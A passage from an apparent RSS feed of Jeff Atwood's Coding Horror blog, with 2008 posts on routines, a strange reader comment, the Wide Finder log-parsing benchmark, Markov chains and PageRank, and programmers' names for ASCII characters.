<guid>https://blog.codinghorror.com/please-give-us-your-email-password/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The Greatest Invention in Computer Science ]]></title>
<link>https://blog.codinghorror.com/the-greatest-invention-in-computer-science/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
What do you think the single greatest invention in computer science is? Besides the computer itself, I mean.
</p>
<p>
Seriously, before reading any further, pause here for a moment and consider the question.
</p>
<p>
I've talked before about <a href="http://www.codinghorror.com/blog/archives/000686.html">how young so-called modern computer programming languages really are</a>, and it bears repeating for context.
</p>
<p>
</p>
<blockquote>
<p>
C is roughly as old as I am; FORTRAN is as old as my parents. But what about the new kids on the block? The TIOBE software <a href="http://www.tiobe.com/tpci.htm">TCPI metrics page</a> provides some data on language popularity going back to the year 2001. Consider the tender age of many of the newest, hippest programming languages:
</p>
<p>
</p>
<ul>
<li>
<a href="http://en.wikipedia.org/wiki/Perl">Perl</a> (1987)
</li>
<li>
<a href="http://en.wikipedia.org/wiki/Python_programming_language">Python</a> (1991)
</li>
<li>
<a href="http://en.wikipedia.org/wiki/Erlang_programming_language">Erlang</a> (1991)
</li>
<li>
<a href="http://en.wikipedia.org/wiki/Ruby_programming_language">Ruby</a> (1993)
</li>
<li>
<a href="http://en.wikipedia.org/wiki/Java_programming_language">Java</a> (1995)
</li>
<li>
<a href="http://en.wikipedia.org/wiki/JavaScript">JavaScript</a> (1995)
</li>
<li>
<a href="http://en.wikipedia.org/wiki/PHP">PHP</a> (1995)
</li>
</ul>
<p>
Ruby is barely a teenager. JavaScript and PHP haven't even <i>hit</i> their teens yet.
</p>
</blockquote>
<p>
For all our talk about fancy new programming language features, I sometimes think we forget the one fundamental building block underlying all of them: the humble routine. Take it from Steve McConnell, who urges us to <a href="http://stevemcconnell.com/ieeesoftware/bp16.htm">Use Routines, Routinely</a>:
</p>
<p>
</p>
<blockquote>
Aside from the invention of the computer, <b>the routine is arguably the single greatest invention in computer science</b>. It makes programs easier to read and understand. It makes them smaller (imagine how much larger your code would be if you had to repeat the code for every call to a routine instead of invoking the routine). And it makes them faster (imagine how hard it would be to make performance improvements in similar code used in a dozen places rather than making all the performance improvements in one routine). In large part, <b>routines are what make modern programming possible.</b>
</blockquote>
<p>
If you're not old enough to remember life before routines, I thought James Shore had a great example of the stark difference in his excellent article <a href="http://jamesshore.com/Articles/Quality-With-a-Name.html">Quality With a Name</a>:
</p>
<p>
Before structured programming:
</p>
<p>
</p>
<pre>
1000 NS% = (80 - LEN(T$)) / 2
1010 S$ = ""
1020 IF NS% = 0 GOTO 1060
1030 S$ = S$ + " "
1040 NS% = NS% - 1
1050 GOTO 1020
1060 PRINT S$ + T$
1070 RETURN
</pre>
<p>
After structured programming:
</p>
<p>
</p>
<pre>
public void PrintCenteredString(string text) {
int center = (80 - text.Length) / 2;
string spaces = "";
for (int i = 0; i &lt; center; i++) {
spaces += " ";
}
Print(spaces + text);
}
</pre>
<p>
The humble routine is the backbone of all programming in any modern language. I'm sure you're the very model of a modern programmer, so I won't bore you with a long explanation of why routines are a good idea. <a href="http://stevemcconnell.com/ieeesoftware/bp16.htm">The original 1998 IEEE McConnell article</a> covers the rationales behind routines quite well. There's also a greatly expanded version of that material in Chapter 7 of <a href="http://www.amazon.com/exec/obidos/ASIN/0735619670/codihorr-20">Code Complete 2</a>.
</p>
<p>
Routines are so fundamental to today's programming that they are essentially invisible. <b>That's the problem with routines: they only take a minute to learn, but a lifetime to master.</b> If bad unstructured programming was possible, so is bad structured programming. <a href="http://www.codinghorror.com/blog/archives/000272.html">You can write FORTRAN in any language.</a> Wrestling with the ineffable essence of a routine is, almost to a first approximation, what programming now <i>is</i>:
</p>
<p>
</p>
<ul>
<li>How long should this routine be? How long is too long? How short is too short? When is code "too simple" to be in a routine?
</li>
<li>What parameters should be passed to this routine? What data structures or data types? In what order? How will they be used? Which will be modified as a result of the routine?
</li>
<li>What's a good name for this routine? Naming is hard. <a href="http://www.codinghorror.com/blog/archives/000553.html">Really hard</a>.
</li>
<li>How is this routine related to other nearby routines? Do they happen at the same time, or in the same order? Do they share common data? Do they really belong together? What order should they be in?
</li>
<li>How will I know if the code in this routine succeeded? Should it return a success or error code? How will exceptions, problems, and error conditions be handled?
</li>
<li>Should this routine <i>even exist at all?</i>
</li>
</ul>
<p>
Good programmers -- regardless of whatever language they happen to be working in -- understand the importance of crafting each routine with <a href="http://secretgeek.net/upsert_revisited.asp">the utmost care</a>. The routines in your code should be treated like tiny, highly polished diamonds, each one more exquisitely polished and finely cut than the last.
</p>
<p>
I'll grant you this isn't a particularly deep insight. It's not even original advice. But if you believe, as I do, in constantly <a href="http://www.codinghorror.com/blog/archives/000549.html">practicing the fundamentals</a>, <b>you'll never stop mastering the art of writing the perfect routine.</b>
</p>
<p>
It is, after all, the single greatest invention in computer science.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-06T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-greatest-invention-in-computer-science/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Finally, a Definition of Programming I Can Actually Understand ]]></title>
<link>https://blog.codinghorror.com/finally-a-definition-of-programming-i-can-actually-understand/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I believe very strongly that <a href="http://www.codinghorror.com/blog/archives/000538.html">a blog without comments is not a blog</a>. For me, the whole point of this blogging exercise is the many-way communication of the comments -- between me and the commenters, and among the commenters themselves.
</p>
<p>
As I said in <a href="http://www.codinghorror.com/blog/archives/000893.html">How To Advertise on Your Blog Without (Completely) Selling Out</a>:
</p>
<p>
</p>
<blockquote>
It's an open secret amongst bloggers that <b>the blog comments are often better than the original blog post</b>, and it's because the community collectively knows far more than you or I will ever know.
</blockquote>
<p>
Indeed, the best part of a blog post often begins where the blog post ends. If you are offended by that, I humbly submit you don't understand why blogs work.
</p>
<p>
A blog without comments is like <i>Amazon without user reviews</i>. Is it really even worth using at that point? The products themselves are commodities; I could buy them anywhere. Having dozens of highly relevant, informed user reviews means I'll almost always buy stuff from Amazon given the chance. It's a huge competitive advantage.
</p>
<p>
Comments aren't the only form of commentary on a blog post. Yes, you can follow comments on Reddit, on Digg, even on other blogs using <a href="http://technorati.com/tools/linkcount/">Technorati's distributed trackback mechanism</a>, and so forth. I also try to practice <a href="http://scoble.weblogs.com/2003/02/26.html">Scoble's 21st rule</a> without being all creepy and <a href="http://www.imdb.com/title/tt0094721/">Beetlejuice</a> about it. All of these are great and worthwhile conversations, but <b>none of them can match the immediacy of viewing comments right there inline with the original article</b>.
</p>
<p>
Of course, as with all other useful things, there is <a href="http://www.codinghorror.com/blog/archives/001009.html">a dark side to comments</a>.
</p>
<p>
</p>
<blockquote>
I scrutinize every comment, and I remove a tiny percentage of them: they might be outright spam, patently off-topic, or just plain mean. I like to refer to this as weeding my web garden. It's a productivity tax you pay if you want to grow a bumper crop of comments, which, despite what <a href="http://www.joelonsoftware.com/items/2007/07/20.html">Joel Spolsky</a> and <a href="http://www.roughtype.com/archives/2006/03/seven_rules_for.php">Nicholas Carr</a> would tell you, often bear such wonderful fruit. The labor can be minimized with improved equipment, but it's always there in some form. And I'm OK with that. The myriad benefits of a robust comment ecosystem outweighs the minor maintenance effort.
</blockquote>
<p>
I really try to avoid deleting comments unless they're egregiously violating the above guidelines. I do read every comment that is posted here, and although I am unable to respond to them all -- I can barely get through my email backlog these days -- rest assured that I eventually read every single individual comment left on this site. I enjoy constructive criticism and feedback. I even welcome downright <i>un</i>constructive criticism, if it's amusing or useful enough.
</p>
<p>
Comments mean additional work for the blog owner. Personally, I don't mind spending a little time every day weeding out mundane evils: spam links, naked promotion, offensive rhetoric, and so on. It's well worth it to harness the considerable collective wisdom of our community. Comments are a large part of what makes this blog work.
</p>
<p>
And then there are... <i>the strange comments</i>.
</p>
<p>
I don't mean your average <a href="http://www.fark.com/">Fark</a> level of strange. I'm talking about category 5 weirdness, the equivalent of the Loch Ness Monster and Bigfoot combined. I'm talking about comments that feel like they were teleported here from another dimension. About once a year, I'll discover a comment so mind-bendingly bizarre and wonderful that it defies description. This year's strongest contender comes to us from "Hello" on my <a href="http://www.codinghorror.com/blog/archives/000051.html#endcomments">Why I'm The Best Programmer In The World*</a> blog post:
</p>
<p>
</p>
<blockquote>
Programming is all about knowing when to boil the orange sponge donkey across the phillipines with an orangutang gorilla crossed with a ham sandwich to the fourth power of twelve across the nile with an awful headache from the previous night when all of alfred's naughty jalapeno peppers frog-marched the nordic elves across the loom-lined geronimo induced swamp donkey over and above the fortran fortified kilomanjaro fence past the meticulously crafted anti disgusting sponge cake scenario where all the hats doth quoteth the milk which is not unlike the super werewolf from the infinite realm of ninja-step. it's hard to define, really.
</blockquote>
<p>
Finally, <b>a definition of programming I can actually understand</b>.
</p>
<p>
I don't think any stronger proof that <i>comments are awesome</i> has ever been written. So, wherever and whoever you are, "hello", thanks for that one. You've restored my faith in the value of comments for another year.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-07T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/finally-a-definition-of-programming-i-can-actually-understand/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Exploring Wide Finder ]]></title>
<link>https://blog.codinghorror.com/exploring-wide-finder/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I have <a href="http://www.codinghorror.com/blog/archives/001062.html">decidedly mixed feelings about the book Beautiful Code</a>, but one of the better chapters is Tim Bray's "Finding Things". In it, he outlines the creation of a small Ruby program:
</p>
<p>
</p>
<pre>
counts = {}
counts.default = 0
ARGF.each_line do |line|
if line =~ %r{GET /ongoing/When/dddx/(dddd/dd/dd/[^ .]+) }
counts[$1] += 1
end
end
keys_by_count = counts.keys.sort { |a, b| counts[b] &lt;=&gt; counts[a] }
keys_by_count[0 .. 9].each do |key|
puts "#{counts[key]}: #{key}"
end
</pre>
<p>
Tim calls Ruby "the most readable of languages"; I think that's a bit of a stretch, but I'm probably the wrong person to ask, because <a href="http://alarmingdevelopment.org/?p=79">I've learned to distrust beauty</a>:
</p>
<p>
</p>
<blockquote>
It seems that infatuation with a design inevitably leads to heartbreak, as overlooked ugly realities intrude. Love is blind, but computers aren't. A long term relationship -- maintaining a system for years -- teaches one to appreciate more domestic virtues, such as straightforwardness and conventionality. Beauty is an idealistic fantasy: what really matters is the quality of the never ending conversation between programmer and code, as each learns from and adapts to the other. Beauty is not a sufficient basis for a happy marriage.
</blockquote>
<p>
But I digress. Even if you have no idea what <a href="http://en.wikipedia.org/wiki/Ruby_programming_language">Ruby</a> is, this simple little program isn't too difficult to decipher. It helps if you know that <a href="http://www.tbray.org/ongoing/">Tim Bray's blog</a> URLs look like this:
</p>
<p>
</p>
<pre>
http://www.tbray.org/ongoing/When/<font color="red">200x/2007/09/20/Wide-Finder</font>
</pre>
<p>
This is a program to <b>count the most common HTTP GET URL entries in a webserver log file</b>. We loop through the entire log file, building up a key-value pair of these URLs, where the key is the unique part of the URL, and the value is the number of times that URL was retrieved.
</p>
<p>
Maybe it's just the Windows developer in me, but one might wonder <b>why you'd bother writing this code at all</b> in the face of umpteen zillion free and commerical web logfile statistics software packages. After all, <a href="http://www.codinghorror.com/blog/archives/000878.html">the best code is no code at all</a>.
</p>
<p>
Well, perhaps there is a reason for this code to exist after all. Tim eventually turned this snippet of code into a benchmarking exercise -- <a href="http://www.tbray.org/ongoing/When/200x/2007/09/20/Wide-Finder">The Wide Finder Project</a>.
</p>
<p>
</p>
<blockquote>
It's a classic example of the culture, born in Awk, perfected in Perl, of getting useful work done by combining regular expressions and hash tables. I want to figure out <b>how to write an equivalent program that runs fast on modern CPUs with low clock rates but many cores</b>; this is the Wide Finder project.
</blockquote>
<p>
A noble experiment, indeed. The benchmarks were performed on the following hardware:
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.sun.com/servers/coolthreads/t5120/">Sun T5120</a>
</li>
<li>8 UltraSPARC T2 CPU cores @ 1.4 GHz
</li>
<li>64 GB RAM
</li>
</ul>
<p>
The input data is as follows:
</p>
<p>
</p>
<ul>
<li>The complete set of Tim's web logfiles from March 2007
</li>
<li>926 MB
</li>
<li>4,625,236 lines
</li>
</ul>
<p>
The results are sort of.. well, <a href="http://www.tbray.org/ongoing/When/200x/2007/10/30/WF-Results">all over the map</a>. I'll summarize with the worst and best scores for each language:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="350">
<tr>
<td></td>
<td align="right">Slowest</td>
<td align="right">Fastest</td>
</tr>
<tr>
<td><a href="http://en.wikipedia.org/wiki/Perl">Perl</a></td>
<td align="right">44.29</td>
<td align="right">1.51</td>
</tr>
<tr>
<td><a href="http://en.wikipedia.org/wiki/Erlang_(programming_language)">Erlang</a></td>
<td align="right">37.58</td>
<td align="right">3.54</td>
</tr>
<tr>
<td><a href="http://en.wikipedia.org/wiki/Python_(programming_language)">Python</a></td>
<td align="right">41.04</td>
<td align="right">4.38</td>
</tr>
<tr>
<td><a href="http://en.wikipedia.org/wiki/Ocaml">OCaml</a></td>
<td align="right">49.69</td>
<td align="right">14.64</td>
</tr>
<tr>
<td><a href="http://en.wikipedia.org/wiki/Ruby_programming_language">Ruby</a></td>
<td align="right">1:43.71</td>
<td align="right">50.16</td>
</tr>
</table>
<p>
I'm simplifying quite a bit here, and omitting languages with only one submission, so do <a href="http://www.tbray.org/ongoing/When/200x/2007/10/30/WF-Results">head over to the actual results page</a> for more detail.
</p>
<p>
While you're there, I also suggest reading <a href="http://www.tbray.org/ongoing/When/200x/2007/11/12/WF-Conclusions">Tim's analysis of the results</a>, wherein he argues that some of the code optimizations that "won" the benchmarks should be automatic and nearly transparent to the programmer. He proposes that, <b>in a perfect world, a <i>one-character</i> change to the original Ruby program would be all it takes to enable all the necessary multicore optimizations</b>:
</p>
<p>
</p>
<pre>
ARGF.each_line<font color="red">*</font> do |line|
</pre>
<p>
I heartily agree. Personally, I think that's the most important result from the Wide Finder Experiment. When it comes to multicore performance, <a href="http://www.codinghorror.com/blog/archives/000577.html">choice of language is no silver bullet</a>. How else can we explain the <i>massive</i> disparity between the fastest and slowest versions of the code in each language?
</p>
<p>
As experiments go, Wide Finder was a reasonably successful one, if somewhat incomplete and perhaps too small. Tim has addressed both of those criticisms and rebooted with <a href="http://www.tbray.org/ongoing/When/200x/2008/05/01/Wide-Finder-2">The Wide Finder 2 Project</a>. It's bigger, badder, and brawnier, but the goal remains the same:
</p>
<p>
</p>
<blockquote>
The problem is that <b>lots of simple basic data-processing operations, in my case a simple Ruby script, run like crap on modern many-core processors.</b> Since the whole world is heading in the slower/many-core direction, this is an unsatisfactory situation.
<p>
If you look at the results from last time, it's obvious that there are solutions, but the ones we've seen so far impose an awful complexity cost on the programmer. The holy grail would be something that maximizes ratio of performance increase per core over programmer effort. My view: Anything that requires more than twice as much source code to take advantage of many-core is highly suspect.
</p>
</blockquote>
<p>
Check the <a href="http://wikis.sun.com/display/WideFinder/Wide+Finder+Home">Wide Finder 2 Project Wiki</a> for all the key details. The <a href="http://wikis.sun.com/display/WideFinder/The+Benchmark">naive Ruby implementation</a> currently takes 25 hours -- yes, <i>hours</i> -- to complete. Some clever programmers have already beaten this result by almost two orders of magnitude, per the <a href="http://wikis.sun.com/display/WideFinder/Results">results wiki page</a>.
</p>
<p>
<a href="http://wikis.sun.com/display/WideFinder/Wide+Finder+Home">Wide Finder</a> isn't a perfect experiment, but it is a relatively simple, easily understandable summary of the problems facing all of tomorrow's software developers in the coming massively multicore world. <b>Can you do better on the time <i>without</i> exploding either the code size, the code complexity, or the average programmer's head?</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-09T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/exploring-wide-finder/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Markov and You ]]></title>
<link>https://blog.codinghorror.com/markov-and-you/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>In <a href="http://www.codinghorror.com/blog/archives/001130.html">Finally, a Definition of Programming I Can Actually Understand</a> I marvelled at particularly strange and wonderful comment left on this blog. Some commenters wondered if that comment was generated through <a href="http://en.wikipedia.org/wiki/Markov_chain">Markov chains</a>. I considered that, but I had a hard time imagining a text corpus input that could possibly produce output so profoundly weird.</p>
<p>So <strong>what are these Markov chains</strong> we're talking about?</p>
<p>One example of Markov chains in action is <a href="http://joshmillard.com/garkov/">Garkov</a>, where the long running <a href="http://en.wikipedia.org/wiki/Garfield">Garfield</a> cartoon strip meets Markov chains.  I present below, for your mild amusement, two representative strips I found on the <a href="http://joshmillard.com/garkov/famehall.cgi">Garkov hall of fame</a>:</p>
<p><img alt="image placeholder" >
<p><img alt="image placeholder" >
<p>Garfield's an easy target, though:</p>
<ul>
<li>
<a href="http://garfieldminusgarfield.net/">Garfield Minus Garfield</a>. What it says on the tin. Surprisingly cathartic. </li>
<li>
<a href="http://www.lasagnacat.com/">Lasagna Cat</a>. Almost indescribably strange live action recreations of Garfield strips. If you only click one link in this post, make it this one. Sanity optional. </li>
<li>
<a href="http://www.garfieldvariations.com/">Garfield Variations</a>. Hand-drawn versions of Garfield in underground "comix" style, usually on paper napkins. </li>
<li>
<a href="http://www.thereverend.com/barfield/index.html">Barfield</a>. Garfield strips subtly modified to include amusing bodily functions. </li>
<li>
<a href="http://permanent-monday.blogspot.com/">Permanent Monday</a>. Literary commentary on selected strips. </li>
<li>
<a href="http://www.tailsteak.com/arbuckle/">Arbuckle</a>. Strips faithfully redrawn by random internet "artists", with one dramatic twist: Jon can't actually <em>hear</em> Garfield, because he is, after all, a cat. </li>
<li>
<a href="http://www.dougshaw.com/garfield.html">Garfield Randomizer</a>. Sadly defunct – combined random panels to form "new" Garfield strips. </li>
</ul>
<p>So let's proceed to the "kov" part of Garkov. The best description of Markov chains I've ever read is in <a href="http://www.cs.bell-labs.com/cm/cs/pearls/strings.html">chapter 15</a> of <a href="http://www.amazon.com/exec/obidos/ASIN/0201657880/codihorr-20">Programming Pearls</a>:</p>
<blockquote>A generator can make more interesting text by making each letter a random function of its predecessor. We could, therefore, read a sample text and count how many times every letter follows an A, how many times they follow a B, and so on for each letter of the alphabet. When we write the random text, we produce the next letter as a random function of the current letter. The Order-1 text was made by exactly this scheme:
<blockquote><strong>t I amy, vin. id wht omanly heay atuss n macon aresethe hired boutwhe t, tl, ad torurest t plur I wit hengamind tarer-plarody thishand.</strong></blockquote>
<p>We can extend this idea to longer sequences of letters. The order-2 text was made by generating each letter as a function of the two letters preceding it (a letter pair is often called a digram). The digram TH, for instance, is often followed in English by the vowels A, E, I, O, U and Y, less frequently by R and W, and rarely by other letters.</p>
<blockquote><strong>Ther I the heingoind of-pleat, blur it dwere wing waske hat trooss. Yout lar on wassing, an sit." "Yould," "I that vide was nots ther.</strong></blockquote>
<p>The order-3 text is built by choosing the next letter as a function of the three previous letters (a trigram).</p>
<blockquote><strong>I has them the saw the secorrow. And wintails on my my ent, thinks, fore voyager lanated the been elsed helder was of him a very free bottlemarkable,</strong></blockquote>
<p>By the time we get to the order-4 text, most words are English, and you might not be surprised to learn that it was generated from a Sherlock Holmes story ( <a href="http://sherlock-holmes.classic-literature.co.uk/the-adventure-of-the-abbey-grange/">"The Adventure of Abbey Grange''</a>).</p>
<blockquote><strong>His heard." "Exactly he very glad trouble, and by Hopkins! That it on of the who difficentralia. He rushed likely?" "Blood night that.</strong></blockquote>
</blockquote>
<p>So the text in Garkov strips is generated in exactly this way, but using words instead of letters. The input corpus is, as you'd expect, the text of many old Garfield strips.</p>
<p>What's amazing to me about Markov chains is how unbelievably <em>simple</em> they are. A Markov chain has no memory of previous states: the next state (word, in our case) is chosen based on a random dice roll and a lookup into a table of the states that tend to historically follow the current state in the input corpus. Given an adequate input corpus, they work almost uncannily well, a testament to the broad power of rudimentary statistical inference. Garfield's been around since 1978, and still going str.. well, going, so there's no shortage of material to work with.</p>
<p>Now let's try it ourselves. I fed the text of the last twelve <a href="http://www.paulgraham.com/articles.html">Paul Graham essays</a> to <a href="http://www.beetleinabox.com/mkv_input.html">this online Markov generator</a>, using two word groupings – what Bentley refers to as "Order-2". Here's what I got back:</p>
<blockquote>You can feel the need to take advantage of increased cheapness, however. You're not all playing a zero-sum game. There's not some fixed number of startups; we fund startups we fund to work on matters of passing importance. But I'm uncomfortably aware that this is part of any illusions about the problem of overeating by stopping eating. I couldn't simply avoid the Internet had become, because the company is the new trend of worrying obsessively about what it meant for someone, usually an outsider, who deliberately stirred up fights in a startup than just start it. You know how the A List is selected. And even that is more work.</blockquote>
<p>But Markov chains aren't just useful for automatically generating Paul Graham essay parodies. They're also <a href="http://en.wikipedia.org/wiki/Markov_chain#Applications">quite practical</a>. You might even say Markov chains are a large part of what powers today's internet. Most remarkably, to me at least, Markov chains underly <a href="http://en.wikipedia.org/wiki/PageRank">Google's trillion dollar PageRank formula</a>:</p>
<blockquote>The [PageRank] formula uses a model of a random surfer who gets bored after several clicks and switches to a random page. The PageRank value of a page reflects the chance that the random surfer will land on that page by clicking on a link. <strong>[PageRank] can be understood as a Markov chain in which the states are pages, and the transitions are all equally probable and are the links between pages.</strong>
<p>As a result of Markov theory, it can be shown that the PageRank of a page is the probability of being at that page after lots of clicks. This happens to equal t<sup>-1</sup> where t is the expectation of the number of clicks (or random jumps) required to get from the page back to itself.</p>
</blockquote>
<p>Incidentally, if you haven't read the original 1998 PageRank paper, titled <a href="http://citeseer.ist.psu.edu/cache/papers/cs/7144/http:zSzzSzwww-db.stanford.eduzSz~backrubzSzpageranksub.pdf/page98pagerank.pdf">The PageRank Citation Ranking: Bringing Order to the Web</a> (pdf), you really should. It's remarkable how, ten years on, so many of the predictions in this paper have come to pass. It's filled with interesting stuff; the list of the top 15 PageRank sites circa 1996 in Table 1 is an eye-opening reminder of how far we've come. Plus, there are references to pornographic sites, too!</p>
<p>Markovian models – specifically, hidden Markov Models – are also <a href="http://www.codinghorror.com/blog/archives/000423.html">related to our old friend, Bayesian spam filtering</a>. They're <em>even better!</em> The most notable example is the <a href="http://crm114.sourceforge.net/">CRM114 Discriminator</a>, as outlined in this <a href="http://crm114.sourceforge.net/docs/Plateau99.pdf">excellent presentation</a> (pdf).</p>
<p><img alt="image placeholder" >
<p>If you play with the <a href="http://www.beetleinabox.com/mkv_input.html">Markov text synthesizer</a>, you'll quickly find that Markov methods are only as good as their input corpus. Input a bunch of the same words, or random gibberish, and that's what you'll get back.</p>
<p>But it's sure tough to imagine a more ideal input corpus for Markovian techniques than the unimaginable vastness of web and email, isn't it?</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-11T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/markov-and-you/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ ASCII Pronunciation Rules for Programmers ]]></title>
<link>https://blog.codinghorror.com/ascii-pronunciation-rules-for-programmers/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
As programmers, we deal with a lot of unusual keyboard characters that typical users rarely need to type, much less think about:
</p>
<p>
</p>
<pre>
$ # % {} * [] ~ &amp; &lt;&gt;
</pre>
<p>
Even the characters that are fairly regularly used in everyday writing -- such as the humble dash, parens, period, and question mark -- have radically different meaning in programming languages.
</p>
<p>
This is all well and good, but you'll eventually have to read code out loud to another developer for some reason. And then you're in an awkward position, indeed.
</p>
<p>
<b>How do you <i>pronounce</i> these unusual ASCII characters?</b>
</p>
<p>
We all do it, but we don't necessarily think much about the words we choose. I certainly hadn't thought much about this until yesterday, when I read the following comment left on <a href="http://www.codinghorror.com/blog/archives/001131.html">Exploring Wide Finder</a>:
</p>
<p>
</p>
<blockquote>
A friend sent me a Java code fragment in which he looped through printing "Thank You!" a million times (it was a response to a professor who had extended the deadline on a paper). I responded with a single line of Ruby to do the same, and a single line of Lisp.
<p>
He wrote back: "<b>Underscores, pipes, octothorpes, curly braces</b> -- sheesh... I'll take a mild dose of verbosity if means I don't have to code something that looks like it's been zipped already!"
</p>
</blockquote>
<p>
<a href="http://www.worldwidewords.org/weirdwords/ww-oct1.htm">What the heck is an <i>octothorpe?</i></a> I know this as the <i>pound</i> key, but that turns out to be a US-centric word; most other cultures know it as the <i>hash</i> key.
</p>
<p>
I'm often surprised to hear what other programmers name their ASCII characters. Not that the words I personally use to identify my ASCII characters are any more correct, but there's far more variability than you'd expect considering the rigid, highly literal mindset of most programmers.
</p>
<p>
Perhaps that's why I was so excited to discover the <a href="http://catb.org/jargon/html/A/ASCII.html">ASCII entry in The New Hacker's Dictionary</a>, which <a href="http://www.scribkin.com/">Phil Glockner</a> turned me on to. It's a fairly exhaustive catalog of the common names, rare names, and occasionally downright <i>weird</i> names that programmers associate with the ASCII characters sprinkled throughout their code.
</p>
<p>
How many of these ASCII pronunciations do you recognize? Which ones are the "correct" ones in your shop?
</p>
<p>
</p>
<table cellpadding="16" cellspacing="0" width="620">
<tr>
<td valign="top">
 </td>
<td valign="top">
Common Names</td>
<td valign="top">
Rare Names</td>
</tr>
<tr bgcolor="Gainsboro" style="border-top: 6px dotted red;">
<td style="font-size: xx-large;" valign="top">
<b>!</b>
</td>
<td valign="top">
<b>exclamation mark</b><br>
<a href="http://catb.org/jargon/html/B/bang.html">bang</a><br>
pling<br>
excl<br>
not<br>
shriek</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
factorial<br>
exclam<br>
smash<br>
cuss<br>
boing<br>
yell<br>
</td>
<td valign="top">
wow<br>
hey<br>
wham<br>
eureka<br>
spark-spot<br>
soldier<br>
control</td>
</tr>
</table>
</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>"</b>
</td>
<td valign="top">
<b>quotation marks</b><br>
quote<br>
double quote<br>
<br>
</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
literal mark<br>
double-glitch<br>
dieresis<br>
dirk</td>
<td valign="top">
rabbit-ears<br>
double prime</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>#</b>
</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
<b>hash<br>
</b>pound sign<b><br>
</b>number sign<br>
pound<b><br>
</b>
</td>
<td valign="top">
sharp<br>
<a href="http://catb.org/jargon/html/C/crunch.html">crunch</a><br>
hex<br>
mesh</td>
</tr>
</table>
</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
grid<br>
crosshatch<br>
octothorpe<br>
flash<br>
square<br>
pig-pen</td>
<td valign="top">
tictactoe<br>
scratchmark<br>
thud<br>
thump<br>
<a href="http://catb.org/jargon/html/S/splat.html">splat</a>
</td>
</tr>
</table>
</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
$</td>
<td valign="top">
<b>dollar sign<br>
</b>dollar</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
currency symbol<br>
buck<br>
cash<br>
string</td>
<td valign="top">
escape<br>
ding<br>
cache<br>
big money</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
%</td>
<td valign="top">
<b>percent sign<br>
</b>mod<br>
grapes</td>
<td valign="top">
double-oh-seven</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
&amp;</td>
<td valign="top">
<b>ampersand</b><br>
amp<br>
amper<br>
and<br>
and sign</td>
<td valign="top">
address<br>
reference<br>
andpersand<br>
bitand<br>
background<br>
pretzel</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
'</td>
<td valign="top">
<b>apostrophe</b><br>
single quote<br>
quote<br>
</td>
<td valign="top">
<table style="width: 100%">
<tr>
<td valign="top" width="40%">
prime<br>
glitch<br>
tick<br>
irk<br>
</td>
<td valign="top">
pop<br>
spark<br>
closing single quotation mark<br>
acute accent<br>
</td>
</tr>
</table>
</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
( )</td>
<td valign="top">
<b>opening / closing parenthesis<br>
</b>left / right paren<br>
left / right parenthesis<br>
left / right<br>
open / close<br>
open / close paren<br>
paren / thesis</td>
<td valign="top">
so/already<br>
lparen/rparen<br>
opening/closing parenthesis<br>
opening/closing round bracket<br>
left/right round bracket<br>
wax/wane<br>
parenthisey/unparenthisey<br>
left/right ear</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>[ ]</b>
</td>
<td valign="top">
<b>opening / closing bracket<br>
</b>left / right bracket<br>
left / right square bracket<br>
bracket / unbracket</td>
<td valign="top">
square / unsquare<br>
u turn / u turn back</td>
</tr>
<tr>
<td style="font-size: xx-large;" valign="top">
<b>{ }</b>
</td>
<td valign="top">
<b>opening / closing brace</b><br>
open / close brace<br>
left / right brace<br>
left / right squiggly<br>
left / right squiggly bracket/brace<br>
left / right curly bracket/brace</td>
<td valign="top">
brace / unbrace<br>
curly / uncurly<br>
leftit / rytit<br>
left / right squirrelly<br>
embrace / bracelet</td>
</tr>
<tr bgcolor="Gainsboro">
<td style="font-size: xx-large;" valign="top">
<b>&lt; &gt;</b>
</td>
<td valign="top">
<b>less / greater than</b><br>
bra / ket<br>
left / right angle<br>
left / right angle bracket<br>
left / right broket</td>
<td valign="top">
from / into (or towards)<br>
read from / write to<br>
suck / blow<br>
comes-from / gozinta<br>
in / out<br>
crunch / zap<br>
tic / tac<br>
angle / right angle</td>
</tr>
<tr>
